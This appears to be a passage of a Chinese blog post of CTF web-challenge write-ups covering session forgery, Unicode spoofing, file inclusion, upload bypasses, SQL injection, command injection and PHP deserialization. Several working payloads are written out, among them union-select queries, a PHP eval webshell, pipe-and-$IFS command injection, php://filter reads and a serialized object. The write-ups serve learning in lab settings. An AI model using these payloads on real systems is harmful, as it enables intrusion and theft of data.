src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaixw55qtj30pa05qq39.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfalpci52zj30og04oq36.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfalpr57d2j30ml05xwjt.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfalqobraoj30mj05c42c.jpg" alt=""></p><p>用得到的cookie值替换掉index页面的cookie值，即可成功伪造session，”变成admin”，得到flag</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaltk9yfnj30qb0bkt95.jpg" alt=""></p><p><strong>法二 —— Unicode欺骗</strong></p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfamywjzioj30d502jglg.jpg" alt=""><br>这里用到了nodeprep.prepare函数，而nodeprep是从twisted模块中导入的from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep，在requirements.txt文件中，发现这里用到的twisted版本是Twisted==10.2.0，而官网最新版本为19.2.0(2019/6/2)，版本差距这么大，估计是存在什么漏洞。</p><p>原理就是利用nodeprep.prepare函数会将unicode字符ᴬ转换成A，而A在调用一次nodeprep.prepare函数会把A转换成a。<br>所以当我们用ᴬdmin注册的话，后台代码调用一次nodeprep.prepare函数，把用户名转换成Admin，我们用ᴬdmin进行登录，可以看到index页面的username变成了Admin，证实了我们的猜想，接下来我们就想办法让服务器再调用一次nodeprep.prepare函数即可。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfan8syszjj30cq09j3yj.jpg" alt=""></p><p>我们发现在改密码函数代码里，也用到了nodeprep.prepare函数，也就是说，我们在这里改密码的话，先会把username改为admin，从而改掉admin的密码。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfana7tvutj30om0as74g.jpg" alt=""><br>然后用admin和改的密码的登录，即可获取flag。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfanbj04yrj30sz0bpt95.jpg" alt=""></p><p><strong>解法三 —— 条件竞争</strong><br><a href="https://www.jianshu.com/p/f92311564ad0" target="_blank" rel="noopener" title="HCTF2018-admin">https://www.jianshu.com/p/f92311564ad0</a></p><h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfanstiw0oj30sy04ggmf.jpg" alt=""><br>查看源码发现提示</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfantton39j30lg0cd74g.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfanujro2lj30ev087dft.jpg" alt=""></p><p>继续点击，发现什么也没有，根据提示抓包分析。</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfanvn1llgj307804va9x.jpg" alt=""></p><p>发现php页面，打开该页面<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbe5son5aj30uk0aaaap.jpg" alt=""><br>发现是文件包含漏洞。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbefqitdfj30s7092aa9.jpg" alt=""><br>但是打开flag.php并不能看到flag，所以flag应该是写在php代码里面</p><p>传入的文件进行了过滤，但没有过滤filter，所以可以用php://filter来获取文件。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbebnttfzj31hc096abe.jpg" alt=""><br>获取到flag.php的base64编码，进行解码获得flag。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbee8u6y0j30m60880tg.jpg" alt=""></p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbetawh5jj308g048mx2.jpg" alt=""></p><p>发现是文件上传漏洞，于是想到上传一句话木马。</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbeulv6d1j307n04pwef.jpg" alt=""></p><p>上传一句话木马后发现&lt;?被过滤了，所以不能使用&lt;?php,所以使用其他的方法构造一句话木马，如script脚本<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbfoa6kc7j30hg00wa9v.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbfp2jc2oj308v059mx5.jpg" alt=""></p><p>上传之后发现错误提示，所以需要绕过exif_imagetype。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbfrgfz2nj30hf01m0sm.jpg" alt=""></p><p>所以在一句话木马前加上GIF89a再上传。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbfuz0qq3j30np05sgly.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbfwrx895j30ae04wq2s.jpg" alt=""></p><p>然后用蚁剑连接index.php页面，发现不能连接，所以是木马没有执行。</p><p>看了题解后发现这题还有一个知识点就是<strong>.user.ini</strong><br><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener" title=".user.ini">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbg2rycpdj309w01tmwz.jpg" alt=""><br>于是创建一个.user.ini文件并将.user.ini和aaa.jpg文件上传<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbg4unow1j30tl05m3yw.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbg63dc06j30ca03zmx5.jpg" alt=""></p><p>然后蚁剑连接获得flag。</p><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbgko45ufj30rh0i5woi.jpg" alt=""><br>尝试万能密码<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbgm3qdh3j30tj09kgpl.jpg" alt=""><br>登录成功，说明存在注入点</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbgpg5cd6j30eu03iq32.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbgpu8llwj30sy09fgp3.jpg" alt=""><br>说明有3个字段。</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbgr5czwlj30f80a4dj7.jpg" alt=""></p><p>在用户名方框里没有注入成功，在密码方框里注入成功</p><p>在密码框中使用<br>admin’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #<br>列出表名<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbh26o28hj30lb0a0wi4.jpg" alt=""></p><p>接着使用<br>admin’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=”l0ve1ysq1” #<br>列出字段</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbh9yytzxj30m109z420.jpg" alt=""></p><p>最后使用<br>admin’ union select 1,2,group_concat(password) from l0ve1ysq1 #<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbhbpxpejj30wy0d2jxu.jpg" alt=""></p><p>获得flag。</p><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbl86nvixj30oj07g3zk.jpg" alt=""><br>根据提示，页面有备份文件</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbl7ooiwbj30aw011weh.jpg" alt=""></p><p>使用dirsearch扫描，发现备份文件<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbl9scevgj30l804gwep.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfblb4esaxj30og0o3gn8.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfblbvo3qlj30b403x3yh.jpg" alt=""></p><p>从class.php和index.php可知，该题是反序化漏洞。代码审计可知username应为admin，password应为100才能获得flag。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfblhrdqzsj30j00fl75c.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfblitplw1j30lg01ya9x.jpg" alt=""></p><p>将代码反序化</p><p>public、protected与private在序列化时的区别和__wakeup()方法绕过参考：<br><a href="https://www.cnblogs.com/wangtanzhi/p/12193930.html" target="_blank" rel="noopener" title="参考链接">https://www.cnblogs.com/wangtanzhi/p/12193930.html</a></p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfblqidxzoj314i0hddj5.jpg" alt=""><br>构造payload获得flag，也可以参考上面的参考链接中<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfblrwxv7sj30na01q0sn.jpg" alt=""></p><p>用python传值获得flag</p><h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfblwywrjlj30lt0980sw.jpg" alt=""></p><p>发现是一句话木马，直接用菜刀连接</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfblyno71fj30gj08e74n.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfblzgek3aj30f403kq2y.jpg" alt=""></p><p>然后获得flag。</p><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbm49rup2j30jw06iglm.jpg" alt=""></p><p>查看源码，发现提示<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbm5hp0hdj319b09pn3u.jpg" alt=""><br>想到抓包，直接改header头信息即可，我们可以通过使用Referer头来修改<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbm8kwmz8j30yn0ha76b.jpg" alt=""><br>修改之后提示说使用Syclover浏览，于是修改User-Agent<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbma2trtuj30yp0gftan.jpg" alt=""><br>根据提示，需要修改X-Forwarded-For为127.0.0.1<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbmcnwclyj30y70g940e.jpg" alt=""><br>从而获得flag。</p><h2 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a>[GKCTF2020]CheckIN</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbmr1prhpj30ne0dbdgp.jpg" alt=""></p><p>审计代码发现Ginkgo可以传参，于是想到可以传一句话木马，审计代码可知要把$this-&gt;code进行base64加密。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbnef4v15j30qo0213yl.jpg" alt=""></p><p>所以Ginkgo传入加密后的<strong>@eval($_POST[value]);</strong><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbng00sipj30f60c774p.jpg" alt=""></p><p>用蚁剑连接<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbnuh85awj30jw076taw.jpg" alt=""></p><p>直接利用github上的exploit:<br><a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank" rel="noopener" title="exploit">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbnxf3636j30gd07wmxj.jpg" alt=""><br>改为执行/readflag。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbnyikohcj30s90fomy3.jpg" alt=""><br>上传到服务器</p><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbo3njuclj30zr066t9l.jpg" alt=""><br>构造payload：?Ginkgo=include(‘/tmp/exploit.php’);并将include(‘/tmp/exploit.php’);用base64加密，执行获得flag。</p><h2 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h2><p>由hint知识<strong>cve-2020-7066，ssrf</strong>漏洞<br><a href="https://security-tracker.debian.org/tracker/CVE-2020-7066" target="_blank" rel="noopener" title="CVE-2020-7066">https://security-tracker.debian.org/tracker/CVE-2020-7066</a><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbo8gz2aaj30mi040t8s.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbo9eot9fj30rc0hu0th.jpg" alt=""><br>点击View CTFHub发现什么也没有<br>根据漏洞可知存在\0截断。<br><a href="https://blog.csdn.net/weixin_45485719/article/details/106432960?fps=1&locationNum=2" target="_blank" rel="noopener" title="cve-2020-7066简单解析">https://blog.csdn.net/weixin_45485719/article/details/106432960?fps=1&amp;locationNum=2</a><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbofn9rapj309h014q2q.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbodclbhzj30u20gygn7.jpg" alt=""><br>根据提示知应该改为127.0.0.123<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfboejavs8j30ti0hh75x.jpg" alt=""><br>从而获得flag。 </p><h2 id="GKCTF2020-老八小超市儿"><a href="#GKCTF2020-老八小超市儿" class="headerlink" title="[GKCTF2020]老八小超市儿"></a>[GKCTF2020]老八小超市儿</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbokpmsh8j30ze0bxjya.jpg" alt=""><br>从图中可知是ShopXO漏洞<br>参考<br><a href="http://www.nctry.com/1660.html" target="_blank" rel="noopener" title="ShopXO">http://www.nctry.com/1660.html</a><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbonczmoqj30vx0gracr.jpg" alt=""><br>进入后台登录界面，用admin,shopxo登录后台<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbopongy4j30si0l9tdo.jpg" alt=""><br>下载默认主题<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbottukynj30qw06naal.jpg" alt=""><br>将写好的一句话木马文件直接拖入压缩包中(注意：不能先解压然后将文件放进去再压缩，这样文件就会失效)<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbow18efvj30lf0ea0tk.jpg" alt=""><br>然后上传木马文件，用蚁剑连接<br>地址是：<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbozq44m5j30lu01oaa1.jpg" alt=""><br>在目录下看到<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbp0wk696j30ko02it8o.jpg" alt=""><br>告诉我们flag在/root下，并且flaghint中的时间每隔一分钟会变化<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbp394dfvj30ih03ogln.jpg" alt=""><br>根据auto.sh找到makeflaghint.py<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbp78g5shj30a805dt8x.jpg" alt=""></p><p>发现有修改权限，且有root的执行权限，能每60秒刷新hint文件。</p><p>rb+ 读写打开一个二进制文件，只允许读写数据。<br><a href="https://blog.csdn.net/guyue6670/article/details/6681037" target="_blank" rel="noopener" title="fopen">https://blog.csdn.net/guyue6670/article/details/6681037</a><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbpc2izasj30a006ct90.jpg" alt=""></p><p>于是修改代码能读取flag并写入flag.hint文件中<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfbpdoahgmj30bp03wq2z.jpg" alt=""></p><p>等待60秒查看获得flag。</p><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>本题是文件包含漏洞，使用php://filter伪协议来进行包含。<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1giozldc8t9j31b60k53zv.jpg" alt=""><br>获得一段base64编码。<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1giozma059gj30cr022glm.jpg" alt=""><br>base64解密后获得flag。</p><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giqis13lyqj30us0liwfq.jpg" alt=""><br>和之前做过的一个题类似，直接构造payload:<br>?ip=127.0.0.1|ls<br>发现flag文件。  |直接执行后面的语句。<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1giqivbz1h2j30xq0lcabb.jpg" alt=""><br>直接cat flag.php发现题目过滤了空格，所以用${IFS}$绕过空格。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giqj1r0h4qj30vn0kygmu.jpg" alt=""><br>使用${IFS}$发现过滤了{符号，所以使用$IFS$1过滤。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giqj3f00kkj30rq0l8gmq.jpg" alt=""><br>使用$IFS$1发现题目又过滤了flag。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giqj47ke8cj30u50lb76l.jpg" alt=""><br>查看该题源码即可知道本次过滤了哪些东西。</p><p>方法一：<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giqj6axvdrj30t90lc0v0.jpg" alt=""><br>参考大佬的wp，构造payload:cat$IFS$1<code>ls</code>,查看源码获得flag。<br>该方法名叫内联执行。方法：将反引号内命令的输出作为输入执行。</p><p>方法二：<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1giqjxzkiesj31050legmz.jpg" alt=""><br>Y2F0IGZsYWcucGhw是cat flag.php的base64编码。</p><p>方法三：<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1giqk3hkg8jj30wg0lidh7.jpg" alt=""><br>采用拼接的方法。<br>参考:<a href="https://www.ghtwf01.cn/index.php/archives/273/" target="_blank" rel="noopener">https://www.ghtwf01.cn/index.php/archives/273/</a></p><h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giqkcm3prij30oy0a9q37.jpg" alt=""><br>打开发现和上一题一样，于是构造一样的payload发现该目录下没有flag。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giqke8rijtj30d309aq2w.jpg" alt=""></p><p>查看上一级目录也没有发现flag。<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1giqkfcr8nyj30d40izjrl.jpg" alt=""><br>所以猜测flag在根目录下，查询后发现果然有flag。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1giqkghkrxbj30cp08vjrg.jpg" alt=""><br>从而获得flag。</p><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giqlq6u9b5j31d40ic13y.jpg" alt=""><br>经过测试发现本题需要使用双写进行绕过，并且from,union,select这些函数都被替换为空。例如用uniunionon，检测时其中的union替换为空，所以变成了union，因此能绕过检测。<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giqlshb7inj31470i4gve.jpg" alt=""><br>使用联合注入进行注入。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giqltzeyfej31260hrtif.jpg" alt=""><br>查询数据库名。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1giqm338dbnj31g40kk145.jpg" alt=""><br>查表名。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giqm46pu58j31fa0iu7fm.jpg" alt=""><br>查列名。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giqm5a52iyj319p0j07f9.jpg" alt=""><br>查字段。</p><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1girdbmsqz3j30tb08x0zk.jpg" alt=""><br>尝试上传带有一句话木马的jpg文件发现题目过滤了&lt;?。</p><p><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1girdh6orubj30st0620sw.jpg" alt=""></p><p>修改木马为：<script language="php">eval($_POST['shell']);</script><br>显示文件不是图片，所以加上GIF89a绕过图片检测。<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1girdhhemukj30mw06y74b.jpg" alt=""></p><p>成功上传文件<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1girdmbo2g3j30qa05oq3e.jpg" alt=""><br>然后抓包修改文件后缀名为php发现被检测到了。</p><p>某些情况下绕过后缀名检测：</p><p>php,php3,php4,php5,phtml,pht</p><p><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1girdp5j5ibj30po07emxw.jpg" alt=""><br>逐个测试，最后发现使用phtml可以绕过检测，从而成功上传木马。<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1girdqlg5c1j30ps04yglt.jpg" alt=""><br>连接蚁剑后在根目录下找到flag。</p><h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>从题目可知该题是要查找备份文件，尝试.bak发现备份文件。<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gire1el7lpj30ld0amdge.jpg" alt=""><br>审计代码可知输入的key只能为数字而且key要和str相等才能获得flag.</p><p>本题考查PHP的弱类型特性，int和string是无法直接比较的，php会将string转换成int然后再进行比较，转换成int比较时只保留数字。<br>所以只需要key等于123即可获得flag。</p><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1girm8rdlp3j30vz0bq75t.jpg" alt=""><br>上传文件的题，于是上传带有一句话木马的jpg文件然后抓包修改后缀为.php发现被检测出来了，尝试之前的利用phtml绕过。<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1girmaxa2qsj313g0aqmys.jpg" alt=""><br>成功上传文件。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1girmbw5y7yj30rh05ogm0.jpg" alt=""><br>蚁剑连接后在根目录成功获得flag。</p><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>查看源码发现pay.php页面。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1girmtur0qsj30gw090t9g.jpg" alt=""><br>查看pay.php页面的源码发现如上代码。<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1girmw99p9wj310e01pt8n.jpg" alt=""><br>抓包分析发现需要cuit’s学生才能购买，而且user=0，所以想到这里的user是判断是不是cuit’s学生，修改user=1后证明猜想。<br>下一步便是如让password=404，但是password不能是数字。</p><p>这里考查<strong>php中的is_numeric()漏洞</strong></p><p>is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！</p><p><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1girn38afobj314r03jmx8.jpg" alt=""><br>password正确后便是输入money，但是money的值显示长度太长。</p><p>strcmp漏洞</p><p>注：这一个漏洞适用与5.3之前版本的php</p><p>这个函数是用于比较字符串的函数</p><p>int strcmp ( string $str1 , string $str2 )</p><p>参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</p><p>可知，传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数将会有怎么样的行为呢？实际上，当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0 。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1girn896mbtj30ya04h3ym.jpg" alt=""><br>所以采用数组绕过money获得flag。</p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1girof886dzj30on0d4ab6.jpg" alt=""><br>打开题目即可看到源码。</p><p>第一个需要绕过的点：</p><p>if(isset($text)&amp;&amp;(file_get_contents($text,’r’)===”welcome to the zjctf”))</p><p>需要我们传入一个文件并且文件内容为welcome to the zjctf。<br>本题没有符合该内容的文件，所以使用data伪协议。<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1giromvw3t1j30sx0bz0tr.jpg" alt=""><br>构造?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=绕过第一个检测。</p><p>第二个需要绕过的点:<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1girp05dtdkj30dv059q36.jpg" alt=""></p><p>本题不能直接读取flag，所以需要先读取useless.php的内容，针对php文件需要进行base64编码，不然不能读到内容。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giroxrba4aj30fb07vt8v.jpg" alt=""><br>构造?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/convert.base64-encode/resource=useless.php读取到useless.php的内容。</p><p>第三个需要绕过的点:</p><p><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1giroqu3o0yj30bq0300so.jpg" alt=""><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1girp620tycj30iz0gjab3.jpg" alt=""><br>所以构造password能够读到flag.php的内容。<br>最后的payload:<br>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}<br>查看源码获得flag。</p><p>参考：<br><a href="https://www.cnblogs.com/wangtanzhi/p/12184759.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12184759.html</a></p><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1girsnt4zzrj31bl07r0u6.jpg" alt=""><br>在网络中的响应头中发现本题的提示</p><p>select * from ‘admin’ where password=md5($pass,true)<br>查看wp后知道本关使用ffifdyop来绕过，这个字符串md5加密后是276f722736c95d99e921722cf9ed621c，经过hex解密后是’or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c。拼接后形式是select * from ‘admin’ where password=’’ or ‘6xxxxx’构成万能密码，从而绕过md5函数。</p><p>输入ffifdyop后页面发生变化。<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1girt0gqvt9j30eq05vmxb.jpg" alt=""></p><p>在源码中发现以上内容。</p><p>md5 bypass</p><p>md5()或者sha1()之类的函数计算的是一个字符串的哈希值，对于数组则返回false，如果$a和$b都是数组则双双返回FALSE, 两个FALSE相等得以绕过。</p><p>这里也可以找出md5都是0e开头的，0e开头的md5的结果为0.</p><p>QNKCDZO，<br>s155964671a，<br>s1091221200a等都是0e开头的。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1girt6lsxr0j30r3075glv.jpg" alt=""><br>页面再次跳转后获得一段代码。<br>这里使用数组绕过，原理是md5不能处理数组，导致函数返回null。<br>从而获得flag。</p><h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>一开始以为是报错注入，最后得到的data发现是自己的注册信息，于是百度了一下，发现这题是有robots.txt文件。<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giscnbbqznj30mc04x3yq.jpg" alt=""><br>发现题目有备份文件，下载之后打开<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1giscoldaawj30zh0ohmz1.jpg" alt=""><br>得到题目的代码。<br>对代码进行审计，发现本题考查的是ssrf。<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gisf2jjfauj30sm0c9q4m.jpg" alt=""><br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gisflky5vzj314r0jsdhh.jpg" alt=""><br>经报错注入查看data中的数据发现本题应该要利用反序列化的知识。<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gisfp3cyf1j30jc0dm74x.jpg" alt=""><br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gisfsik39wj318k0kt75q.jpg" alt=""><br>最终的payload如图所示，列名依次为no,username,passwd,data，所以data的值在四号位传入。<br><img 